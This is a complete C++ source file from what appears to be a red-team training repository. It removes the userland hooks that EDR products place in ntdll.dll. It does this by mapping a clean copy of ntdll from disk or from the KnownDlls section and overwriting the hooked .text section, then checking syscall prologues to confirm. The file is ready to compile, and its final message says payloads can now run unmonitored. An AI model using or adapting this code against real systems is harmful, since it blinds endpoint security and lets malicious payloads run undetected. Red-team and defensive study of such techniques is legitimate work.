/*
 * Red Team Exercises #68 - EDR Unhooking via Manual DLL Mapping
 * Author: Joas Antonio dos Santos
 * Repository: https://github.com/CyberSecurityUP/Red-Team-Exercises
 * Courses: https://courses.redteamleaders.com/
 *
 * Description:
 *   Maps a clean copy of ntdll.dll from disk into the process,
 *   then overwrites the .text section of the hooked ntdll with the
 *   clean copy. Removes all userland hooks placed by EDR.
 *
 * Two methods:
 *   Method 1: Read ntdll from disk (C:\Windows\System32\ntdll.dll)
 *   Method 2: Read from KnownDlls section (\KnownDlls\ntdll.dll)
 *
 * Compile: cl /EHsc unhook_ntdll.cpp
 */

#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#pragma comment(lib, "ntdll.lib")

// NtOpenSection / NtMapViewOfSection typedefs
typedef NTSTATUS(NTAPI* pNtOpenSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes
);

typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
);

// ---------------------------------------------------------------
// Method 1: Map clean ntdll from disk file
// ---------------------------------------------------------------
LPVOID MapNtdllFromDisk() {
    printf("[*] Method 1: Reading ntdll.dll from disk...\n");

    HANDLE hFile = CreateFileW(
        L"C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open ntdll from disk: %lu\n", GetLastError());
        return NULL;
    }

    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMapping) {
        printf("[-] CreateFileMapping failed: %lu\n", GetLastError());
        CloseHandle(hFile);
        return NULL;
    }

    LPVOID pClean = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);

    CloseHandle(hMapping);
    CloseHandle(hFile);

    if (pClean) {
        printf("[+] Clean ntdll mapped from disk at: 0x%p\n", pClean);
    }
    return pClean;
}

// ---------------------------------------------------------------
// Method 2: Map clean ntdll from KnownDlls
// (avoids file read monitoring by some EDRs)
// ---------------------------------------------------------------
LPVOID MapNtdllFromKnownDlls() {
    printf("[*] Method 2: Reading ntdll from \\KnownDlls\\...\n");

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtOpenSection NtOpenSection =
        (pNtOpenSection)GetProcAddress(hNtdll, "NtOpenSection");
    pNtMapViewOfSection NtMapViewOfSection =
        (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");

    if (!NtOpenSection || !NtMapViewOfSection) {
        printf("[-] Failed to resolve Nt functions\n");
        return NULL;
    }

    UNICODE_STRING sectionName;
    sectionName.Buffer = (PWSTR)L"\\KnownDlls\\ntdll.dll";
    sectionName.Length = (USHORT)(wcslen(sectionName.Buffer) * sizeof(WCHAR));
    sectionName.MaximumLength = sectionName.Length + sizeof(WCHAR);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &sectionName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hSection = NULL;
    NTSTATUS status = NtOpenSection(&hSection, SECTION_MAP_READ, &objAttr);
    if (status != 0) {
        printf("[-] NtOpenSection failed: 0x%lx\n", status);
        return NULL;
    }

    PVOID pClean = NULL;
    SIZE_T viewSize = 0;
    status = NtMapViewOfSection(hSection, GetCurrentProcess(), &pClean,
                                 0, 0, NULL, &viewSize, 1, 0, PAGE_READONLY);
    CloseHandle(hSection);

    if (status != 0) {
        printf("[-] NtMapViewOfSection failed: 0x%lx\n", status);
        return NULL;
    }

    printf("[+] Clean ntdll mapped from KnownDlls at: 0x%p (size: %zu)\n",
           pClean, viewSize);
    return pClean;
}

// ---------------------------------------------------------------
// Unhook: Replace hooked .text section with clean copy
// ---------------------------------------------------------------
BOOL UnhookNtdll(LPVOID pCleanNtdll) {
    // Get the loaded (hooked) ntdll base address
    HMODULE hHookedNtdll = GetModuleHandleA("ntdll.dll");
    if (!hHookedNtdll) {
        printf("[-] GetModuleHandle(ntdll) failed\n");
        return FALSE;
    }

    printf("[*] Hooked ntdll at: 0x%p\n", hHookedNtdll);

    // Parse PE headers to find .text section
    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)pCleanNtdll;
    PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)(
        (BYTE*)pCleanNtdll + pDosHdr->e_lfanew
    );

    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHdr);

    for (WORD i = 0; i < pNtHdr->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)pSection[i].Name, ".text") == 0) {
            printf("[+] Found .text section:\n");
            printf("    Virtual Address: 0x%lx\n", pSection[i].VirtualAddress);
            printf("    Virtual Size:    0x%lx\n", pSection[i].Misc.VirtualSize);

            // Calculate addresses
            LPVOID pCleanText = (BYTE*)pCleanNtdll + pSection[i].VirtualAddress;
            LPVOID pHookedText = (BYTE*)hHookedNtdll + pSection[i].VirtualAddress;
            SIZE_T textSize = pSection[i].Misc.VirtualSize;

            // Change hooked .text to writable
            DWORD oldProtect = 0;
            if (!VirtualProtect(pHookedText, textSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                printf("[-] VirtualProtect (RWX) failed: %lu\n", GetLastError());
                return FALSE;
            }

            // Copy clean .text over hooked .text
            memcpy(pHookedText, pCleanText, textSize);
            printf("[+] Copied %zu bytes from clean .text to hooked .text\n", textSize);

            // Restore original permissions
            VirtualProtect(pHookedText, textSize, oldProtect, &oldProtect);
            printf("[+] Permissions restored to 0x%lx\n", oldProtect);

            return TRUE;
        }
    }

    printf("[-] .text section not found\n");
    return FALSE;
}

// ---------------------------------------------------------------
// Verify unhooking by checking function prologues
// ---------------------------------------------------------------
void VerifyUnhook() {
    printf("\n[*] Verifying unhook - checking Nt function prologues:\n");

    const char* funcs[] = {
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory",
        "NtWriteVirtualMemory",
        "NtCreateThreadEx",
        "NtOpenProcess",
        NULL
    };

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

    for (int i = 0; funcs[i]; i++) {
        BYTE* pFunc = (BYTE*)GetProcAddress(hNtdll, funcs[i]);
        if (!pFunc) continue;

        // Check for clean syscall stub: 4C 8B D1 B8 (mov r10, rcx; mov eax, SSN)
        BOOL isClean = (pFunc[0] == 0x4c && pFunc[1] == 0x8b &&
                        pFunc[2] == 0xd1 && pFunc[3] == 0xb8);

        // Check for typical hook: E9 (jmp) or FF 25 (jmp qword ptr)
        BOOL isHooked = (pFunc[0] == 0xE9 || (pFunc[0] == 0xFF && pFunc[1] == 0x25));

        printf("  %s: [%02x %02x %02x %02x] -> %s\n",
               funcs[i],
               pFunc[0], pFunc[1], pFunc[2], pFunc[3],
               isClean ? "CLEAN" : (isHooked ? "HOOKED!" : "UNKNOWN"));
    }
}

// ---------------------------------------------------------------
// Main
// ---------------------------------------------------------------
int main() {
    printf("[*] Red Team Exercises #68 - EDR Unhooking via Manual DLL Mapping\n\n");

    // Try Method 2 first (KnownDlls), fall back to Method 1 (disk)
    LPVOID pClean = MapNtdllFromKnownDlls();
    if (!pClean) {
        printf("[*] KnownDlls failed, trying disk method...\n");
        pClean = MapNtdllFromDisk();
    }

    if (!pClean) {
        printf("[-] All methods failed. Cannot obtain clean ntdll.\n");
        return 1;
    }

    // Check before unhooking
    printf("\n[*] Before unhooking:\n");
    VerifyUnhook();

    // Perform unhooking
    printf("\n[*] Performing unhook...\n");
    if (UnhookNtdll(pClean)) {
        printf("[+] ntdll.dll successfully unhooked!\n");
    } else {
        printf("[-] Unhooking failed\n");
    }

    // Verify after unhooking
    printf("\n[*] After unhooking:\n");
    VerifyUnhook();

    // Cleanup
    UnmapViewOfFile(pClean);

    printf("\n[+] All hooks removed. Safe to execute payloads via ntdll functions.\n");
    return 0;
}
